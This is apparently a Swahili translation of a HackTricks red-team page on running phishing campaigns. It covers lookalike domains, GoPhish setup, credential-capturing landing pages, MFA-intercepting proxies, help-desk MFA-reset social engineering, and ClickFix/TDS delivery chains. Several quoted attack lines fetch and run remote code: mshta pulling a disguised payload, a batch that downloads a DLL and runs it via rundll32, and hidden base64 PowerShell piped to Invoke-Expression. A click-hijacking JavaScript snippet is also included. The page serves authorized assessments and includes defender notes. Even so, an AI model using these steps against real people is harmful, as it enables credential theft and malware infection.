# Methodology ya Phishing

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Fanya Recon ya victim
1. Chagua **victim domain**.
2. Fanya web enumeration ya msingi **ukitafuta login portals** zinazotumiwa na victim na **amua** ni ipi utakayo **impersonate**.
3. Tumia **OSINT** **kutafuta emails**.
2. Andaa mazingira
1. **Nunua domain** utakayotumia kwa phishing assessment
2. **Sanidi records zinazohusiana na email service** (SPF, DMARC, DKIM, rDNS)
3. Sanidi VPS yenye **gophish**
3. Andaa campaign
1. Andaa **email template**
2. Andaa **web page** ya kuiba credentials
4. Zindua campaign!

## Tengeneza domain names zinazofanana au nunua domain inayoaminika

### Domain Name Variation Techniques

- **Keyword**: Domain name **ina** **keyword** muhimu ya original domain (mfano, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Badilisha **dot iwe hyphen** ya subdomain (mfano, www-zelster.com).
- **New TLD**: Domain ileile ikitumia **TLD mpya** (mfano, zelster.org)
- **Homoglyph**: **Inabadilisha** herufi katika domain name na **herufi zinazofanana kwa mwonekano** (mfano, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Inabadilisha nafasi za** herufi mbili ndani ya domain name (mfano, zelsetr.com).
- **Singularization/Pluralization**: Inaongeza au kuondoa “s” mwishoni mwa domain name (mfano, zeltsers.com).
- **Omission**: **Inaondoa** herufi moja kutoka kwenye domain name (mfano, zelser.com).
- **Repetition:** **Inarudia** mojawapo ya herufi katika domain name (mfano, zeltsser.com).
- **Replacement**: Kama homoglyph lakini si stealthy sana. Inabadilisha mojawapo ya herufi katika domain name, labda kwa herufi iliyo karibu na herufi asili kwenye keyboard (mfano, zektser.com).
- **Subdomained**: Weka **dot** ndani ya domain name (mfano, ze.lster.com).
- **Insertion**: **Inaingiza herufi** kwenye domain name (mfano, zerltser.com).
- **Missing dot**: Ongeza TLD kwenye domain name. (mfano, zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Kuna **uwezekano kwamba baadhi ya bits zilizohifadhiwa au zilizo kwenye mawasiliano zinaweza kubadilishwa moja kwa moja** kutokana na sababu mbalimbali kama vile solar flares, cosmic rays au hardware errors.

Dhana hii **inapotumika kwenye DNS requests**, inawezekana kwamba **domain inayopokelewa na DNS server** si sawa na domain iliyoombwa mwanzoni.

Kwa mfano, mabadiliko ya bit moja kwenye domain "windows.com" yanaweza kuibadilisha kuwa "windnws.com."

Attackers wanaweza **kutumia fursa hii kwa kusajili domains nyingi za bit-flipping** zinazofanana na domain ya victim. Lengo lao ni kuwaelekeza users halali kwenye infrastructure yao.

Kwa maelezo zaidi soma [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Nunua domain inayoaminika

Unaweza kutafuta domain iliyo-expire kwenye [https://www.expireddomains.net/](https://www.expireddomains.net) ambayo unaweza kuitumia.\
Ili kuhakikisha kwamba domain iliyo-expire utakayonunua **tayari ina SEO nzuri**, unaweza kutafuta jinsi ilivyoainishwa kwenye:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Kugundua Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Ili **kugundua** email addresses halali **zaidi** au **kuthibitisha zile** ambazo tayari umegundua, unaweza kuangalia kama unaweza kuzifanyia brute-force kwenye smtp servers za victim. [Jifunze jinsi ya kuthibitisha/kugundua email address hapa](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Zaidi ya hayo, usisahau kwamba ikiwa users wanatumia **web portal yoyote kufikia mails zao**, unaweza kuangalia kama inaathiriwa na **username brute force**, na kutumia vulnerability hiyo ikiwezekana.

## Kus configurar GoPhish

### Installation

Unaweza kuipakua kutoka [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pakua na decompression ndani ya `/opt/gophish` kisha execute `/opt/gophish/gophish`\
Utapewa password ya admin user kwenye port 3333 katika output. Kwa hiyo, fikia port hiyo na utumie credentials hizo kubadilisha admin password. Huenda ukahitaji ku-tunnel port hiyo kwenda local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Usanidi

**Usanidi wa certificate ya TLS**

Kabla ya hatua hii, unapaswa kuwa **tayari umenunua domain** utakayotumia, na lazima iwe **inaelekeza** kwenye **IP ya VPS** unakayosanikisha **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Usanidi wa barua pepe**

Anza kusakinisha: `apt-get install postfix`

Kisha ongeza domain kwenye faili zifuatazo:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Badilisha pia thamani za variables zifuatazo ndani ya /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Hatimaye, badilisha faili **`/etc/hostname`** na **`/etc/mailname`** ziwe na jina la domain yako, kisha **restart VPS yako.**

Sasa, tengeneza **DNS A record** ya `mail.<domain>` inayoelekeza kwenye **ip address** ya VPS, na **DNS MX** record inayoelekeza kwenye `mail.<domain>`

Sasa hebu tuchunguze kutuma barua pepe:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Usanidi wa Gophish**

Simamisha utekelezaji wa gophish na tuisanidi.\
Badilisha `/opt/gophish/config.json` iwe ifuatayo (zingatia matumizi ya https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Sanidi service ya gophish**

Ili kuunda service ya gophish ili iweze kuanzishwa kiotomatiki na kudhibitiwa kama service, unaweza kuunda faili `/etc/init.d/gophish` lenye maudhui yafuatayo:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Malizia kusanidi huduma na kuikagua kwa kufanya:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Kusanidi mail server na domain

### Subiri na uwe halali

Kadiri domain inavyokuwa ya zamani, ndivyo uwezekano wa kutambuliwa kama spam unavyopungua. Kwa hiyo, unapaswa kusubiri muda mrefu iwezekanavyo (angalau wiki 1) kabla ya kufanya phishing assessment. Zaidi ya hayo, ukiweka ukurasa unaohusiana na sekta yenye reputational, reputation utakayopata itakuwa bora zaidi.

Kumbuka kwamba hata ikiwa unapaswa kusubiri wiki moja, unaweza kumaliza kusanidi kila kitu sasa.

### Kusanidi record ya Reverse DNS (rDNS)

Weka record ya rDNS (PTR) inayotatua IP address ya VPS kuwa domain name.

### Record ya Sender Policy Framework (SPF)

Lazima **usanidi record ya SPF kwa domain mpya**. Ikiwa hujui record ya SPF ni nini, [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Unaweza kutumia [https://www.spfwizard.net/](https://www.spfwizard.net) kutengeneza SPF policy yako (tumia IP ya VPS machine)

![SPF Wizard form ya kutengeneza record ya SPF kwa phishing domain](<../../images/image (1037).png>)

Hii ndiyo content inayopaswa kuwekwa ndani ya record ya TXT ndani ya domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Rekodi ya Domain-based Message Authentication, Reporting & Conformance (DMARC)

Lazima **usanidi rekodi ya DMARC kwa domain mpya**. Ikiwa hujui rekodi ya DMARC ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Lazima uunde rekodi mpya ya DNS TXT inayoelekeza hostname `_dmarc.<domain>` yenye maudhui yafuatayo:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Lazima **usanidi DKIM kwa domain mpya**. Ikiwa hujui rekodi ya DKIM ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Mafunzo haya yanatokana na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Unahitaji kuunganisha thamani zote mbili za B64 zinazozalishwa na ufunguo wa DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Jaribu alama ya usanidi wa barua pepe

Unaweza kufanya hivyo ukitumia [https://www.mail-tester.com/](https://www.mail-tester.com)\
Fungua tu ukurasa huo na utume barua pepe kwenye anwani watakayokupa:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Unaweza pia **kuangalia usanidi wa barua pepe yako** kwa kutuma barua pepe kwa `check-auth@verifier.port25.com` na **kusoma jibu** (kwa hili utahitaji **kufungua** port **25** na kuona jibu katika faili _/var/mail/root_ ikiwa utatuma barua pepe ukiwa root).\
Hakikisha kwamba unapita majaribio yote:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Unaweza pia kutuma **ujumbe kwa Gmail unayoidhibiti**, na uangalie **vichwa vya barua pepe** kwenye kikasha chako cha Gmail; `dkim=pass` inapaswa kuwepo katika sehemu ya kichwa ya `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Kuondoa kwenye Spamhaus Blacklist

Ukurasa wa [www.mail-tester.com](https://www.mail-tester.com) unaweza kukuonyesha ikiwa domain yako inazuiwa na Spamhaus. Unaweza kuomba domain/IP yako iondolewe kupitia: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Kuondoa kwenye Microsoft Blacklist

​​Unaweza kuomba domain/IP yako iondolewe kupitia [https://sender.office.com/](https://sender.office.com).

## Kuunda na Kuzindua GoPhish Campaign

### Wasifu wa Kutuma

- Weka **jina la kutambua** wasifu wa mtumaji
- Amua ni akaunti gani utatumia kutuma barua pepe za phishing. Mapendekezo: _noreply, support, servicedesk, salesforce..._
- Unaweza kuacha sehemu za username na password wazi, lakini hakikisha umechagua Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Inapendekezwa kutumia utendakazi wa "**Send Test Email**" ili kuthibitisha kuwa kila kitu kinafanya kazi.\
> Ninapendekeza **kutuma barua pepe za majaribio kwa anwani za 10min mails** ili kuepuka kuwekwa kwenye blacklist wakati wa kufanya majaribio.

### Kiolezo cha Barua Pepe

- Weka **jina la kutambua** kiolezo
- Kisha andika **mada** (usiweke kitu kisicho cha kawaida, weka tu kitu unachotarajia kusoma kwenye barua pepe ya kawaida)
- Hakikisha umechagua "**Add Tracking Image**"
- Andika **kiolezo cha barua pepe** (unaweza kutumia variables kama katika mfano ufuatao):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Kumbuka kwamba **ili kuongeza uaminifu wa email**, inapendekezwa kutumia saini kutoka kwenye email ya mteja. Mapendekezo:

- Tuma email kwa **anwani ambayo haipo** na uangalie kama jibu lina saini.
- Tafuta **email za umma** kama info@ex.com au press@ex.com au public@ex.com, zitumie email na usubiri jibu.
- Jaribu kuwasiliana na **email halali iliyogunduliwa** na usubiri jibu

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template pia inaruhusu **kuambatisha mafaili ya kutuma**. Ikiwa ungependa pia kuiba NTLM challenges kwa kutumia mafaili/documents yaliyoundwa maalum [soma ukurasa huu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Weka **jina**
- **Andika HTML code** ya ukurasa wa tovuti. Kumbuka kwamba unaweza **ku-import** kurasa za tovuti.
- Weka alama kwenye **Capture Submitted Data** na **Capture Passwords**
- Weka **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Kwa kawaida utahitaji kurekebisha HTML code ya ukurasa na kufanya majaribio locally (labda kwa kutumia Apache server) **hadi uridhike na matokeo.** Kisha, andika hiyo HTML code kwenye kisanduku.\
> Kumbuka kwamba ikiwa unahitaji **kutumia static resources** kwa ajili ya HTML (labda baadhi ya CSS na JS pages), unaweza kuzihifadhi kwenye _**/opt/gophish/static/endpoint**_ na kisha kuzifikia kupitia _**/static/\<filename>**_

> [!TIP]
> Kwa redirection unaweza **kuwa-redirect users kwenye legit main web page** ya victim, au kuwa-redirect kwenye _/static/migration.html_ kwa mfano, uweke **spinning wheel (**[**https://loading.io/**](https://loading.io)**) kwa sekunde 5 kisha uonyeshe kwamba mchakato umefanikiwa**.

### Users & Groups

- Weka jina
- **Import data** (kumbuka kwamba ili kutumia template kwa mfano huo unahitaji firstname, last name na email address ya kila user)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Hatimaye, tengeneza campaign ukichagua jina, email template, landing page, URL, sending profile na group. Kumbuka kwamba URL itakuwa link itakayotumwa kwa victims.

Kumbuka kwamba **Sending Profile inaruhusu kutuma test email ili kuona final phishing email itakavyoonekana**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

Kila kitu kikiwa tayari, zindua campaign!

## Website Cloning

Ikiwa kwa sababu yoyote unataka ku-clone website, angalia ukurasa ufuatao:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Katika baadhi ya phishing assessments (hasa kwa Red Teams) utataka pia **kutuma mafaili yenye aina fulani ya backdoor** (labda C2 au kitu kitakachotrigger authentication).\
Angalia ukurasa ufuatao kwa mifano:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Shambulio lililotangulia ni la ujanja sana kwa sababu unafeki website halisi na kukusanya taarifa zilizoingizwa na user. Kwa bahati mbaya, ikiwa user hakuweka password sahihi au ikiwa application uliyoifeki imewekwa na 2FA, **taarifa hizi hazitakuwezesha ku-impersonate user aliyedanganywa**.

Hapa ndipo tools kama [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) na [**muraena**](https://github.com/muraenateam/muraena) zinapokuwa muhimu. Tool hii itakuwezesha kutengeneza shambulio la aina ya MitM. Kimsingi, mashambulio hufanya kazi kwa njia ifuatayo:

1. Una **impersonate login** form ya webpage halisi.
2. User **anatuma** **credentials** zake kwenye fake page yako, na tool inazituma kwenye webpage halisi, **ikihakikisha kama credentials zinafanya kazi**.
3. Ikiwa account imewekwa na **2FA**, MitM page itaomba 2FA hiyo, na mara **user anapoiingiza**, tool itaituma kwenye web page halisi.
4. User akisha-authenticate, wewe (kama attacker) utakuwa **umecapture credentials, 2FA, cookie na taarifa yoyote** kutoka kwenye kila interaction iliyofanywa wakati tool inatekeleza MitM.

### Via VNC

Je, ikiwa badala ya **kumtuma victim kwenye malicious page** yenye mwonekano sawa na ya awali, ungempeleka kwenye **VNC session yenye browser iliyounganishwa kwenye web page halisi**? Utaweza kuona anachofanya, kuiba password, MFA anayotumia, cookies...\
Unaweza kufanya hivi kwa [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Ni wazi kwamba mojawapo ya njia bora za kujua kama umebusted ni **kutafuta domain yako kwenye blacklists**. Ikiwa inaonekana kwenye orodha, kwa namna fulani domain yako imegunduliwa kuwa ya kutiliwa shaka.\
Njia moja rahisi ya kuangalia kama domain yako inaonekana kwenye blacklist yoyote ni kutumia [https://malwareworld.com/](https://malwareworld.com)

Hata hivyo, kuna njia nyingine za kujua kama victim **anatafuta kwa bidii shughuli za phishing zinazotiliwa shaka kwenye internet** kama ilivyoelezwa katika:


{{#ref}}
detecting-phising.md
{{#endref}}

Unaweza **kununua domain yenye jina linalofanana sana** na domain ya victim **na/au kutengeneza certificate** kwa **subdomain** ya domain unayoidhibiti, **ikiwa na** **keyword** ya domain ya victim. Ikiwa **victim** atafanya aina yoyote ya **DNS au HTTP interaction** nazo, utajua kwamba **anatafuta kwa bidii** domains zinazotiliwa shaka na utahitaji kuwa stealth sana.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Tumia [**Phishious** ](https://github.com/Rices/Phishious)kutathmini kama email yako itaishia kwenye spam folder au itablockiwa au itafanikiwa.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Vikundi vya kisasa vya uvamizi vinazidi kuruka email lures kabisa na **kulenga moja kwa moja service-desk / identity-recovery workflow** ili kushinda MFA. Shambulio hili linatumia kikamilifu rasilimali zilizopo: operator akishamiliki credentials halali, huhama kwa kutumia admin tooling iliyojengwa ndani – malware haihitajiki.<sup>[[6]](#references)</sup>

### Attack flow
1. Fanya reconnaissance ya victim
* Kusanya maelezo binafsi na ya kampuni kutoka LinkedIn, data breaches, public GitHub, n.k.
* Tambua identities zenye thamani kubwa (executives, IT, finance) na chunguza **help-desk process kamili** ya password / MFA reset.
2. Social engineering ya wakati halisi
* Piga simu, tumia Teams au chat kuwasiliana na help-desk huku ukijifanya kuwa target (mara nyingi kwa **spoofed caller-ID** au **cloned voice**).
* Toa PII iliyokusanywa awali ili kupita knowledge-based verification.
* Mshawishi agent **areset MFA secret** au afanye **SIM-swap** kwenye mobile number iliyosajiliwa.
3. Hatua za mara moja baada ya kupata access (≤60 min katika hali halisi)
* Weka foothold kupitia web SSO portal yoyote.
* Chunguza AD / AzureAD kwa built-ins (bila kudondosha binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Fanya lateral movement kwa **WMI**, **PsExec**, au agents halali za **RMM** ambazo tayari zimeruhusiwa kwenye environment.

### Detection & Mitigation
* Chukulia identity recovery ya help-desk kama **privileged operation** – hitaji step-up auth na idhini ya manager.
* Deploy rules za **Identity Threat Detection & Response (ITDR)** / **UEBA** zinazotoa alert kuhusu:
* MFA method kubadilishwa + authentication kutoka device / geo mpya.
* Kuongezwa mara moja kwa privilege ya principal huyo huyo (user-→-admin).
* Rekodi simu za help-desk na ulazimishe **call-back kwenye number iliyosajiliwa tayari** kabla ya reset yoyote.
* Tekeleza **Just-In-Time (JIT) / Privileged Access** ili accounts zilizoresetishwa hivi karibuni zisirithi moja kwa moja high-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Vikundi vya kawaida hupunguza gharama ya operations zinazohitaji mwingiliano mkubwa kwa mashambulio ya kiwango kikubwa yanayogeuza **search engines & ad networks kuwa delivery channel**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** husukuma fake result kama `chromium-update[.]site` hadi juu ya search ads.
2. Victim anapakua **first-stage loader** ndogo (mara nyingi JS/HTA/ISO). Mifano iliyoonekana na Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader hu-exfiltrate browser cookies + credential DBs, kisha hupakua **silent loader** inayoamua – *in realtime* – kama itadeploy:
* RAT (k.m. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Block domains zilizosajiliwa hivi karibuni na enforce **Advanced DNS / URL Filtering** kwenye *search-ads* pamoja na email.
* Zuia software installation kwa signed MSI / Store packages, kata execution ya `HTA`, `ISO`, `VBS` kwa policy.
* Monitor child processes za browsers zinazofungua installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt kwa LOLBins zinazotumiwa vibaya mara kwa mara na first-stage loaders (k.m. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Baadhi ya fake software portals huacha download `href` inayoonekana ikielekeza kwenye **real** GitHub/release URL, lakini huteka nyara **interaction ya kwanza** ya user kwenye JavaScript na badala yake humtuma victim kwenye chain ya **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Sifa kuu:
- Hook kwa kawaida huendeshwa katika **capture phase** (`true`) kwenye `document`, hivyo huendeshwa kabla ya handlers za site.
- Chrome mara nyingi hutumia `mousedown` badala ya `click` ili kuweka redirect ikiwa imefungamana na **user gesture** halali na kuboresha kupita **popup-blocker**.
- Baadhi ya variants hufungua mapema `about:blank` au huunda clicks za `<a target="_blank">`, kisha baadaye huweka TDS URL.
- Vikomo vya upande wa browser mara nyingi huhifadhiwa kwenye `localStorage`, hivyo **first click** inaweza kumfikisha victim kwenye malware, huku refreshes/retries zikirejea kwenye visible link inayoonekana benign.
- TDS inaweza kuchuja kwa referrer, entry domain, GEO, browser/device fingerprint, ukaguzi wa VPN/datacenter, click context, na counters za kila session, hivyo replays za analyst huwa si za deterministic.

Mawazo kwa Defender:
- Linganisha `href` **inayoonyeshwa** na navigation target **halisi** inayozalishwa wakati wa click.
- Tafuta handlers za `document.addEventListener(..., true)` zinazoita `preventDefault()` na `stopImmediatePropagation()` zote mbili kuzunguka `window.open`, `about:blank`, au synthetic anchor clicks.
- Chukulia makundi ya software-download domains zilizosajiliwa hivi karibuni ambayo yote hupakia stage ileile ya CloudFront/JS kuwa pattern yenye signal kubwa ya SEO-poisoning/TDS.

### ClickFix kutoka fake verification pages + archive-looking LOLBAS fetches
Baadhi ya TDS branches huishia kwenye fake verification page (ya mtindo wa Cloudflare/IUAM) inayomwambia victim aendeshe Windows binary inayoaminika kama:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Maelezo:
- `mshta.exe` hutekeleza **HTA/VBScript mwanzoni mwa response**, hata kama URL inajifanya kuwa archive ya `.7z`; data ya archive iliyoongezwa inaweza kuwa decoy tupu.
- Stages zinazofuata mara nyingi huendelea kudanganya kuhusu aina ya faili (`.rtf` kwa PowerShell, `.asar` kwa Python, ZIP zenye binaries zilizoongezewa padding), kisha hubadilika kwenda **manual PE mapping / in-memory execution**.
- Ikiwa unajibu mojawapo ya chains hizi, hifadhi **network + memory kuanzia run ya kwanza iliyofaulu**: replays zinazofuata zinaweza kuonyesha tu njia salama ya installer/SFX au kushindwa kwa sababu payload/key release ilifungamanishwa na TDS session ya awali.

### Mbinu za ClickFix DLL delivery (fake CERT update)
* Lure: ushauri uliokopiwa wa national CERT wenye kitufe cha **Update** kinachoonyesha maelekezo ya “fix” hatua kwa hatua. Victims huambiwa waendeshe batch inayopakua DLL na kuiendesha kupitia `rundll32`.<sup>[[12]](#references)</sup>
* Typical batch chain iliyozingatiwa:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` huweka payload kwenye `%TEMP%`, sleep fupi huficha network jitter, kisha `rundll32` huita exported entrypoint (`notepad`).
* DLL hutuma beacon yenye utambulisho wa host na huuliza C2 kila baada ya dakika chache. Remote tasking huwasili ikiwa **base64-encoded PowerShell**, inayotekelezwa kwa siri na policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Hii hudumisha unyumbufu wa C2 (server inaweza kubadilisha tasks bila kusasisha DLL) na huficha console windows. Tafuta PowerShell children wa `rundll32.exe` wanaotumia `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` kwa pamoja.
* Defenders wanaweza kutafuta HTTP(S) callbacks za muundo `...page.php?tynor=<COMPUTER>sss<USER>` na polling intervals za dakika 5 baada ya DLL load.

---

## Phishing Operations zilizoimarishwa na AI
Attackers sasa huunganisha **LLM & voice-clone APIs** kwa lures zilizobinafsishwa kikamilifu na interaction ya wakati halisi.

| Layer | Mfano wa matumizi na threat actor |
|-------|------------------------------------|
|Automation|Kutengeneza na kutuma zaidi ya emails / SMS 100k zenye wording iliyobadilishwa bila mpangilio na tracking links.|
|Generative AI|Kutengeneza *one-off* emails zinazorejelea M&A za umma, inside jokes kutoka social media; deep-fake CEO voice katika callback scam.|
|Agentic AI|Kusajili domains, kukusanya open-source intel, na kuunda next-stage mails kwa kujitegemea victim anapobofya lakini hakutumi creds.|

**Defence:**
• Ongeza **dynamic banners** zinazoangazia messages zilizotumwa kutoka kwa untrusted automation (kupitia ARC/DKIM anomalies).
• Deploy **voice-biometric challenge phrases** kwa maombi ya simu yenye risk kubwa.
• Endelea kuiga lures zinazozalishwa na AI katika awareness programmes – static templates zimepitwa na wakati.

Tazama pia – matumizi mabaya ya agentic browsing kwa credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Tazama pia – matumizi mabaya ya AI agent ya local CLI tools na MCP (kwa secrets inventory na detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly ya phishing JavaScript (in-browser codegen)

